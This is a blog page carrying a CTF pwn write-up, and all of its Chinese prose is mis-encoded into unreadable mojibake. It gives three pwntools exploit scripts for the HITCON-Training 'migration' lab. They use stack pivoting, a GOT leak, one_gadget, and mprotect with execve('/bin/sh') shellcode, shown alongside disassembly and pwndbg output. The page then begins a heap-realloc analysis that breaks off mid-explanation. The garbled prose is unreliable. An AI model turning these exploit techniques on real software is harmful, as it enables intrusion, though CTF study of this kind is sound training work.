<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-2022-01-02-pwnbeginer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/01/02/2022-01-02-pwnbeginer/" class="article-date">
  <time class="dt-published" datetime="2022-01-01T19:18:21.000Z" itemprop="datePublished">2022-01-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/01/02/2022-01-02-pwnbeginer/">pwn æ–°æ‰‹å‘</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>è¿™æ˜¯æˆ‘å‰å¹´å†™çš„ä¸¤ä¸ªå¾ˆç®€å•çš„ pwn é¢˜ï¼Œå¾ˆå¸¸è§„çš„æ ˆè¿ç§»æ€è·¯ï¼Œæˆ‘ç°åœ¨éƒ½çœ‹ä¸æ‡‚äº†ï¼Œ2333ã€‚å¾—è®°ä¸‹æ¥ä»¥åæ²¡äº‹äº†çœ‹ã€‚</p>
<h1 id="ç¬¬ä¸€ä¸ª"><a href="#ç¬¬ä¸€ä¸ª" class="headerlink" title="ç¬¬ä¸€ä¸ª"></a>ç¬¬ä¸€ä¸ª</h1><p>è¿™ä¸ªæ€è·¯æ˜¯è‡ªå·±åšä¸€é“å¾ˆç®€å•çš„é¢˜æ—¶ä¸€æ­¥ä¸€æ­¥è¾¹ä¼˜åŒ–è¾¹æƒ³çš„ï¼Œé¡ºç€è¿™ä¸ªæ€è·¯åŠ æ·±äº†å¯¹æ ˆè¿ç§»çš„ç†è§£ï¼Œåˆ†äº«ä¸€ä¸‹ã€‚ä½†æœ¬äººæ–‡ç¬”å®åœ¨åƒåœ¾ï¼Œå„ä½çœ‹å®˜æœ‰è§‰å¾—ä¸å¯¹åŠ²çš„è¯·åœ¨è¯„è®ºåŒºç•™è¨€</p>
<h1 id="é¢˜ç›®é“¾æ¥å¦‚ä¸‹ï¼ˆæ–‡æœ«ä¹Ÿæ”¾äº†é“¾æ¥"><a href="#é¢˜ç›®é“¾æ¥å¦‚ä¸‹ï¼ˆæ–‡æœ«ä¹Ÿæ”¾äº†é“¾æ¥" class="headerlink" title="é¢˜ç›®é“¾æ¥å¦‚ä¸‹ï¼ˆæ–‡æœ«ä¹Ÿæ”¾äº†é“¾æ¥"></a>é¢˜ç›®é“¾æ¥å¦‚ä¸‹ï¼ˆæ–‡æœ«ä¹Ÿæ”¾äº†é“¾æ¥</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab6/migration">lab6</a></p>
</blockquote>
<h1 id="ç¨‹åºå¤§è‡´åˆ†æ"><a href="#ç¨‹åºå¤§è‡´åˆ†æ" class="headerlink" title="ç¨‹åºå¤§è‡´åˆ†æ"></a>ç¨‹åºå¤§è‡´åˆ†æ</h1><p>ä¿æŠ¤æªæ–½å¦‚æ­¤è¿™èˆ¬ï¼š</p>
<pre><code>â””&gt; checksec migration 
[*] &#39;/home/pic/Desktop/hitcon/migration&#39;
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
	
</code></pre>
<p>ç¨‹åºå¦‚æ­¤è¿™èˆ¬ï¼š</p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+0h] [ebp-28h]

  if ( count != 1337 )
    exit(1);
  ++count;
  setvbuf(_bss_start, 0, 2, 0);
  puts(&quot;Try your best :&quot;);
  return read(0, &amp;buf, 0x40u);
}
</code></pre>
<p>ç¨‹åºå¾ˆå¹²å‡€ï¼Œå­˜åœ¨<code>read</code>å‡½æ•°çš„æº¢å‡ºï¼Œä¸”æº¢å‡ºå­—èŠ‚ä¸º 0x28 å³ 40 ï¼Œä½†ä¸åƒ 64 ä½æœ‰å¾ˆå¥½ç”¨çš„ä¸‡èƒ½ gadget ï¼Œä¹‹å‰åšè¿‡ç±»ä¼¼çš„é¢˜ï¼Œè®°å¾—å¥—è·¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>é€šè¿‡ read å‡½æ•°æŠŠ rop é“¾è¯»åˆ° bss ç«¯</li>
<li>æ„é€  bss ç«¯</li>
<li>è¿ç§»åˆ° bss ç«¯æ‰§è¡Œ</li>
</ul>
<p>ç»è¿‡å¤§è‡´åˆ†æå¸¸è§„å¥—è·¯ï¼Œåº”è¯¥æ˜¯è¦æœ‰ä¸‰æ¬¡ shellcode ï¼Œå› ä¸ºæ„é€  bss ç«¯æ—¶å¿…ç„¶æ— æ³•æ‰§è¡Œä»»ä½•æ“ä½œï¼Œä½†å…¶å®åœ¨æ„é€  bss æ—¶å€™å¯ä»¥æŠŠç¬¬ä¸‰æ¬¡çš„èµ· shell åˆå¹¶ï¼Œå³ä¸‹æ–¹çš„ exp</p>
<h1 id="å¸¦æ ˆè¿ç§»çš„-ret2libc"><a href="#å¸¦æ ˆè¿ç§»çš„-ret2libc" class="headerlink" title="å¸¦æ ˆè¿ç§»çš„ ret2libc"></a>å¸¦æ ˆè¿ç§»çš„ ret2libc</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">one_gadget = base+0x3ac69</span><br><span class="line">payload2 = p32(0)+p32(one_gadget)+p32(0)*8+p32(0x804A008+0x500)+p32(0x8048504)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>one_gadget</code>åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â–¶ one_gadget /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">...</span><br><span class="line">0x3ac69 execve(&quot;/bin/sh&quot;, esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€ä¸‹ç¬¬ä¸€æ¬¡çš„ payload ï¼šï¼ˆå¡«å…¥çš„åœ°å€å°±æ˜¯æ ˆä¸­ï¼‰</p>
<ul>
<li>å°† ebp æ”¹ä¸º<code>0x804A008+0x28+0x500</code>ï¼Œå…¶ä¸­ 0x28 æ˜¯å› ä¸º ebp åœ¨ read æ—¶å†³å®šæœ€é‡è¦çš„å‚æ•°â€“åœ°å€</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x80484f4 &lt;main+73&gt;:	lea    eax,[ebp-0x28]</span><br><span class="line">0x80484f7 &lt;main+76&gt;:	push   eax</span><br><span class="line">0x80484f8 &lt;main+77&gt;:	push   0x0</span><br><span class="line">0x80484fa &lt;main+79&gt;:	call   0x8048380	; read å‡½æ•°</span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x80484EA</code>åœ°å€æ˜¯ <code>call puts</code>ï¼Œä¹‹åçš„æ’å¸ƒå°±æ˜¯ put_got å‚æ•°äº†ï¼Œèƒ½ç›´æ¥æŠŠ puts åœ°å€æ³„éœ²å‡ºæ¥ï¼Œä¾¿äºåè¾¹ <code>one_gadget</code> çš„è®¡ç®—</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:080484E5                 push    offset s        ; &quot;Try your best :&quot;</span><br><span class="line">.text:080484EA                 call    puts</span><br><span class="line">.text:080484EF                 add     esp, 4</span><br><span class="line">.text:080484F2                 push    40h             ; nbytes</span><br><span class="line">.text:080484F4                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484F7                 push    eax             ; buf</span><br><span class="line">.text:080484F8                 push    0               ; fd</span><br><span class="line">.text:080484FA                 call    read</span><br></pre></td></tr></table></figure>

<p>ä¹‹åçš„ç¬¬äºŒæ¬¡ payload ï¼ˆå¡«å†™åœ°å€æ˜¯<code>0x804A008+0x500</code>å°±æ˜¯å› ä¸ºä¹‹å‰ç¬¬ä¸€æ¬¡ payload çš„ ebp å˜åŒ–å¼•èµ·çš„ï¼‰ï¼š</p>
<ul>
<li>å‰ 40 å­—èŠ‚æ²¡ä»€ä¹ˆè¯´çš„ï¼Œå°±æ˜¯æŠŠ one_gadget å¡«åˆ°æ­£ç¡®ä½ç½®ï¼Œæ–¹ä¾¿èµ· shell</li>
<li>ä¹‹åçš„<code>p32(0x804A008+0x500)</code>å°±æ˜¯æœ¬è½®çš„ ebp äº†</li>
<li>ä¹‹å<code>p32(0x8048504)</code>æ˜¯</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048504                 leave</span><br><span class="line">.text:08048505                 retn</span><br></pre></td></tr></table></figure>

<p>ç¨‹åºæº¢å‡ºæ—¶<code>ebp esp eip</code>ä¸‰ä¸ªå¯„å­˜å™¨çŠ¶æ€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0x804A008 + 0x500</span><br><span class="line">esp æ— æ³•ç›´æ¥æ§åˆ¶</span><br><span class="line">eip æ— æ³•ç›´æ¥æ§åˆ¶</span><br></pre></td></tr></table></figure>
<p>ä¹‹åçš„ <code>leave</code>ç‰‡æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0</span><br><span class="line">esp = 0x804A008 + 0x500 + 4 </span><br><span class="line">eip æ— æ³•ç›´æ¥æ§åˆ¶</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡ ret å˜æˆäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0</span><br><span class="line">esp = 0x804A008 + 0x500 + 8</span><br><span class="line">eip = one_gadget</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ° ret åœ°å€å¡«å†™çš„å°±æ˜¯ one_gadget åœ°å€ï¼Œä½†æ˜¯å› ä¸ºæœ¬é¢˜ bss ç«¯åœ°å€å›ºå®šï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥é€šè¿‡ mprotect å‡½æ•°æ¥ä¿®æ”¹ bss å¯æ‰§è¡Œæƒé™ï¼Œè¾¾åˆ°å‘ bss ç«¯å†™ shellcode å¹¶æ‰§è¡Œçš„æ•ˆæœï¼Œ exp å¦‚ä¸‹</p>
<h1 id="å¸¦-mprotect-çš„-ret2shellcode"><a href="#å¸¦-mprotect-çš„-ret2shellcode" class="headerlink" title="å¸¦ mprotect çš„ ret2shellcode"></a>å¸¦ mprotect çš„ ret2shellcode</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">mp = base + libc.symbols[&#x27;mprotect&#x27;]</span><br><span class="line">one = base+0x3ac69</span><br><span class="line">shellcode = &quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload2 = shellcode+&#x27;a&#x27;*(40-len(shellcode))+p32(0)+p32(mp)+p32(0x804A008+0x500)+p32(0x804A000)+p32(0x1000)+p32(7)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€è½®çš„ payload æ²¡å˜ï¼ŒæŠŠç¬¬äºŒè½®çš„å˜æˆäº†</p>
<ul>
<li>å‰ 40 å­—èŠ‚æ˜¯ shellcode å’Œ a å¡«å……</li>
<li>ebp å¯ä»¥éšæ„ï¼Œç”¨ä¸åˆ°</li>
<li>mprotect å‡½æ•°åœ°å€</li>
<li>ret åœ°å€å¡« bss ï¼Œä¹Ÿå³ shellcode åœ°å€</li>
<li>mprotect ç”¨åˆ°çš„å‚æ•°ï¼Œè¾¾åˆ°<code>mprotect(0x804A000,0x1000,7)</code>çš„æ•ˆæœ</li>
</ul>
<p>æ‰§è¡Œ mprotect ä¹‹å‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   /home/pic/Desktop/hitcon/migration</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œ mprotect ä¹‹å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/pic/Desktop/hitcon/migration</span><br></pre></td></tr></table></figure>

<p>æœ‰äº†å¯æ‰§è¡Œæƒé™ï¼Œè·³è½¬è¿‡å»æ‰§è¡Œå°± get shell äº†</p>
<h1 id="ç›´æ¥å¡«å…¥"><a href="#ç›´æ¥å¡«å…¥" class="headerlink" title="ç›´æ¥å¡«å…¥"></a>ç›´æ¥å¡«å…¥</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">one = base+0x3ac69</span><br><span class="line">io.send(p32(0)*11+p32(one))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿™æ‹›æˆåŠŸçš„æ ¸å¿ƒåœ¨äºç¬¬ä¸€æ¬¡ payload å¡«çš„ ret åœ°å€æ˜¯ <code>0x80484EA</code> ç­‰äºæ‰§è¡Œäº†ä¸€éä¸‹è¾¹çš„ <code>leave ret</code> ï¼Œè®©ä¹‹å‰å¡«å…¥çš„ ebp å‘æŒ¥äº†ä½œç”¨ï¼Œæœ‰ç‚¹å›°æƒ‘çš„å¯ä»¥è‡ªè¡Œè°ƒè¯•æ·±å…¥ä½“ä¼šï¼Œåœ¨æ­¤ä¸äºˆä»¥èµ˜è¿°</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ç»è¿‡ä¸Šæ–¹çš„åˆ†æå¤§å®¶åº”è¯¥çœ‹åˆ° ebp ç”¨å¥½å¯¹ exp çš„ç¼–å†™å’Œé¢˜ç›®çš„ç†è§£æœ‰å¤šå¤§ç”¨å¤„ï¼Œå°¤å…¶æ˜¯æœ€åä¸€ä¸ªã€‚æ„Ÿè§‰è‡ªå·±ä¹‹å‰ä¸€ç›´æœ‰ä¸€ä¸ªè¯¯åŒºï¼Œå°±æ˜¯å¡« ebp å°±ä¸€å®šè¦å¡« <code>leave_ret</code> gadget ï¼Œåæ¥å‘ç°ä¸ä¸€å®šï¼Œä¸€å®šè¦æ³¨æ„æ±‡ç¼–å‰åè¯­å¢ƒï¼Œä¸é‡åˆ° ret åšå†³ä¸æ”¾æ¾è­¦æƒ•ã€‚è€Œä¸”æœ‰æ—¶å€™æŠŠ main å‡½æ•°ä¸­é—´æŸä¸€æ®µå½“ä½œ ret åœ°å€å¯ä»¥è¾¾åˆ°å¾ˆå¤šå•çº¯æ„é€  rop é“¾è¾¾ä¸åˆ°çš„æ•ˆæœ</p>
<h1 id="ç¬¬äºŒä¸ª"><a href="#ç¬¬äºŒä¸ª" class="headerlink" title="ç¬¬äºŒä¸ª"></a>ç¬¬äºŒä¸ª</h1><p>æœ€è¿‘ä½›ç³»æ‰¾é¢˜åš,çªç„¶æ‰¾åˆ°äº†ä¸€é“å»å¹´ hitctf çš„é¢˜,çœ‹ç½‘ä¸Šä¹Ÿæ²¡æœ‰ writeup ,äºæ˜¯å†³å®šå¥½å¥½åˆ†æä¸€æ³¢.å¤ªèœäº†,å‰åèŠ±äº† 5 ä¸ªå°æ—¶å§,æœäº†,è¿™é¢˜å­¦äº†å¾ˆå¤š,åˆ†äº«å‡ºæ¥</p>
<h2 id="å†™åœ¨å‰é¢çš„ç¨‹åº"><a href="#å†™åœ¨å‰é¢çš„ç¨‹åº" class="headerlink" title="å†™åœ¨å‰é¢çš„ç¨‹åº"></a>å†™åœ¨å‰é¢çš„ç¨‹åº</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char* a = malloc(0x80);</span><br><span class="line">	char* b = malloc(0x10);</span><br><span class="line">	char* c = malloc(0x20);</span><br><span class="line">	char* d = malloc(0x20);</span><br><span class="line">	char* e = malloc(1);</span><br><span class="line">	a = realloc(a,0x20);</span><br><span class="line">	b = realloc(b,0x20);	//-------&gt;æ–­ç‚¹A</span><br><span class="line">	c = realloc(c,0x20);	//-------&gt;æ–­ç‚¹B</span><br><span class="line">	d = realloc(c,0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬ç¨‹åºæ„æ€ä¾¿æ˜¯ realloc ä¼šé‡æ–°æ’æ­¥å †ç©ºé—´,è¿™é‡Œåªä»‹ç»ä¸€ä¸‹ a å’Œ b å—,å‰©ä¸‹çš„å¯ä»¥è‡ªè¡Œè°ƒè¯•.æ–­åˆ°æ–­ç‚¹ A å¤„æŸ¥çœ‹å˜åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x602030 â—‚â€” 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$5 = 0x602010 &quot;&quot;</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 = 0x6020a0 &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°<code>realloc(a,0x20)</code>åªç”¨åˆ°äº† 0x31 å­—èŠ‚,ä¹‹å‰ malloc å‰©ä¸‹çš„ç›´æ¥æ‰”åˆ°äº† fastbin é‡Œ,è¢« free æ‰.è¿™é‡Œæ³¨æ„ä¸€ä¸‹ b æŒ‡å‘ 0x6020a0 .å•æ­¥è¿è¡Œæ–­åœ¨ B å¤„æŸ¥çœ‹å˜åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$3 = 0x602140 &quot;&quot;</span><br><span class="line">pwndbg&gt; x/8gx 0x602140-0x10</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602160:	0x0000000000000000	0x0000000000020ea1</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602090 â—‚â€” 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x602030 â—‚â€” 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ realloc ä¸€ä¸ªæ¯”ä¹‹å‰å¤§çš„ä¼šä½¿ä¹‹å‰çš„ b ç›´æ¥è¢« free æ‰,é‡æ–°ä¸€ä¸ª malloc ä¸€ä¸ªåˆé€‚çš„è¿”ç»™ b .</p>
<p>å‰è¨€ç»“æŸ</p>
<h2 id="åˆ†ææ€è·¯"><a href="#åˆ†ææ€è·¯" class="headerlink" title="åˆ†ææ€è·¯"></a>åˆ†ææ€è·¯</h2><p>è¿™é¢˜å…¶å®æŒºåå¸¸è§„çš„,ç¨‹åºçš„ bss ç«¯ ptr æŒ‡å‘å­˜æ”¾å†…å®¹å¤´,ä¹‹åçš„å†…å®¹å¤´ä¸­æœ‰æŒ‡å‘å†…å®¹çš„æŒ‡é’ˆ,å¤§è‡´é•¿è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss-&gt;</span><br><span class="line">	**	0x31</span><br><span class="line">  title	name</span><br><span class="line">  time()	chunk_ptr</span><br><span class="line">  size	**</span><br><span class="line">  chk_ptr	-&gt;	content</span><br></pre></td></tr></table></figure>

<p>åœ¨ edit ä¸­æœ‰ä¸€ä¸ªä¸å¤ªæ˜æ˜¾çš„å †æº¢å‡ºæ¼æ´</p>
